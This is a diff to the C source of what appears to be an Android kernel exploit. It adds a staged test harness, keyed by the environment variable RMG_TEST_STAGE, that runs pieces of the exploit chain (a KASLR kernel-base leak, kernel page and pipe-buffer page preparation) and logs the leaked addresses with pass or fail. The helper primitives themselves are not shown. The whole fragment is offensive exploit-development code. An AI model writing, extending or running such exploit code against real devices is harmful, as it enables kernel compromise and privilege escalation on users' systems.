@@ -424,6 +424,56 @@ static int verify_fops_data_alias_before_production(void) {
 }
 #endif
 
+
+static int run_rmg_exploit_test(void) {
+  const char *stage = getenv("RMG_TEST_STAGE");
+  uintptr_t result_value = 0;
+  int ok = 0;
+
+  if (!stage || !*stage || strcmp(stage, "normal") == 0) {
+    return -1;
+  }
+
+  pr_info("rmg-test start stage=%s\\n", stage);
+
+  if (strcmp(stage, "kaslr") == 0) {
+    ok = slide_leak_kernel_base();
+    if (ok) {
+      result_value = kaslr_base;
+    }
+    reset_pipe_attempt();
+  } else if (strcmp(stage, "mm_struct") == 0) {
+    reset_pipe_attempt();
+    result_value = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+    ok = is_direct_ptr(result_value);
+    reset_pipe_attempt();
+  } else if (strcmp(stage, "mm_page") == 0) {
+    reset_pipe_attempt();
+    result_value = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+    ok = is_direct_ptr(result_value);
+    reset_pipe_attempt();
+  } else if (strcmp(stage, "pipe_page") == 0) {
+    reset_pipe_attempt();
+    result_value = prepare_pipe_buffer_page();
+    ok = is_direct_ptr(result_value);
+    pr_info("rmg-test pipe-page base=%016zx\\n", result_value);
+    reset_pipe_attempt();
+  } else {
+    pr_error("rmg-test unknown stage=%s\\n", stage);
+    return 1;
+  }
+
+  if (ok) {
+    pr_success("rmg-test completed stage=%s result=pass value=%016zx\\n",
+               stage, result_value);
+    return 0;
+  }
+
+  pr_error("rmg-test completed stage=%s result=fail value=%016zx\\n",
+           stage, result_value);
+  return 1;
+}
+
 int run_exploit(int argc, char **argv) {
   (void)argc;
   (void)argv;
@@ -434,6 +484,12 @@ int run_exploit(int argc, char **argv) {
   init_ashmem_path();
 
   pin_to_core(CORE);
+
+  int rmg_test_result = run_rmg_exploit_test();
+  if (rmg_test_result >= 0) {
+    return rmg_test_result;
+  }
+
 #if defined(SLIDE_STACK_WRITER) && \
     defined(SLIDE_STACK_WRITER_SIGRETURN) && \
     SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
